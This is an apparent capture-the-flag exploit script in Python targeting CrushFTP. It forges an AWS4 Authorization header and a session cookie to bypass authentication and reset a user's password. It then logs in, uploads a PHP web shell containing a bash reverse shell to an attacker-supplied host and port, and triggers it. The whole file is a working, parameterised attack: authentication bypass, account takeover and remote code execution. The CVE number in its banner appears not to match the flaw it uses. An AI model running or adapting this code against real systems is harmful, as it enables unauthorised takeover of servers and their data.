import requests 
import argparse 
import random 
import string
import sys 

'''
Author : 0xRushi 
github : https://github.com/RushikeshNerkar820

Poc : Soulmate www-data 

'''


def parse_arguments():

    parser = argparse.ArgumentParser(description='Crushftp To Auth bypass to RCE',
                                     epilog='''
Example : 
Basic Usage : python3 exploit.py -t <target> -u <user> -p <newpass> -l <lhost> -P <lport>
                                     ''',
                                     formatter_class=argparse.RawDescriptionHelpFormatter

                                    )


 
    parser.add_argument(
        '-t' , '--target',
        required = True,
    )    

    parser.add_argument(
        '-u' , '--username',
        required = True 
    )

    parser.add_argument(
        '-p' , '--password',
        required = True 
    )

    parser.add_argument(
        '-l' , '--lhost',
        required = True 

    )

    parser.add_argument(
        '-P','--port',
        required=True,
        dest='lport'  
    )

    parser.add_argument(
        '--filename',
        default=None,
        
    )

    parser.add_argument(
        '--no-reset',
        action='store_true',
        help='Skip password reset'
    )

    args = parser.parse_args()



    return args

# Generating random files w .php extension

def file_name(length):
    c = string.ascii_letters + string.digits
    name = ''.join(random.choice(c) for i in range(length))
    return name + '.php'


def resetpassword(args):
    

    print("[+] Resetting password for user : " + args.username)

    # Headers for auth bypass 
    header = {
        'Authorization' : 'AWS4-HMAC-SHA256 Credential=crushadmin/',
        'Cookie': 'CrushAuth=1743113839553_vD96EZ70ONL6xAd1DAJhXMZYMn1111'
    }
    data = {
        'command' : 'setUserItem',
        'data_action' : 'update',
        'xmlItem' : 'user',
        'serverGroup' : 'MainUsers',
        'username' : args.username,
        'user' : f'<user type="properties"><password>{args.password}</password></user>',
        'c2f' : '1111'

    }
    r = requests.post(args.target + '/WebInterface/function/',
                      headers=header,
                      data=data 
                      )  
    if r.status_code == 200:
        print("Loogin successfull [+] ")
    else:
        print("Login failed [-] ")
        print(f" Status code {r.status_code}")
        sys.exit(1)


def login(args):

    print("[+] logging with new creds ")

    s = requests.session()

    r1 = s.get(args.target + '/WebInterface/function/')

    data = {
        'command' : 'login',
        'username' : args.username,
        'password' : args.password,
        'encoding' : 'true',
        'language' : 'en',
        'random' : '0.5999437459266012'
    }

    r2 = s.post(args.target + '/WebInterface/function/' , data=data)

    if r2.status_code == 200:
        print("Logged in successfull [*]")
    else:
        print(f" [-] Login failed with status code {r2.status_code}")
        sys.exit(1)

    return s
# Uploading the php file 
def upload(args):

    print("[+] Uploading file ")

    if args.filename:
        name = args.filename
    else:
        name = file_name(4)

    print(f"[*] Shell filename : {name}")

    #crating a reverse shell payload 

    payload = f'<?php system("bash -c \'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1\'"); ?>'
    length = len(payload)

    try:
        with open(name,"w") as f:
            f.write(payload)
        print(f"[+] Created shell file : {name}")
    except Exception as e:
        print(f"[-] Error creating file : {e}")
        sys.exit(1)


    s = login(args)
    cookies = s.cookies 
    cookie_dict = cookies.get_dict()

    

    payload1 = {
        'command': (None, 'openFile'),
        'c2f': (None, cookie_dict["currentAuth"]),
        'upload_path': (None, f'/webProd/{name}'),
        'upload_size': (None, length),
        'upload_id': (None, 'mf9ppkcmvp3sys9lhc'),
        'start_resume_loc': (None, '0'),
        'random': (None, '0.7280378758459468')
    }
    
    print("[*] Initiating upload...")
    r = s.post(args.target + '/WebInterface/function/', files=payload1)
    
    
    with open(name, "rb") as g:
        files = {'CFCD': (name, g, 'application/octet-stream')}
        r2 = requests.post(
            args.target + f'/U/mf9ppkcmvp3sys9lhc~1~{length}',
            files=files,
            cookies=cookies
        )
    
    if r2.status_code == 200:
        print("[+] Shell uploaded successfully")
    else:
        print(f"[-] Upload failed with status code: {r2.status_code}")
        sys.exit(1)
    
    return name


def execute_shell(args):
    """
    Trigger the uploaded shell to get reverse connection
    
    Args:
        args: Parsed arguments
    """
    print("[*] Step 4: Executing reverse shell")
    
    
    name = upload(args)
    

    if args.target.startswith('http://'):
        url1 = args.target.replace('http://', "")
        url2 = 'http://' + url1.lstrip('ftp.')
    else:
        url2 = args.target
    
    shell_url = url2 + '/' + name
    print(f"[*] Triggering shell at: {shell_url}")
    print(f"[!] Make sure you have a listener: nc -lvnp {args.lport}")
    
    try:

        r = requests.get(shell_url, timeout=3)
    except requests.exceptions.Timeout:
        print("[+] Shell triggered! Check your listener!")
    except Exception as e:
        print(f"[-] Error triggering shell: {e}")


def main():
    
    # Banner
    print("=" * 70)
    print("CrushFTP Authentication Bypass + RCE Exploit")
    print("CVE-2024-4040")
    print("=" * 70)
    
    

    args = parse_arguments()
    
    
    print(f"\n[*] Target: {args.target}")
    print(f"[*] Username: {args.username}")
    print(f"[*] Password: {args.password}")
    print(f"[*] LHOST: {args.lhost}")
    print(f"[*] LPORT: {args.lport}")
    print()
    
    
    if not args.no_reset:
        
        resetpassword(args)  
    else:
        print("[*] Skipping password reset (--no-reset flag set)")
    
    
    execute_shell(args)
    
    print("\n[*] Exploit complete!")



if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Unexpected error: {e}")
        sys.exit(1)
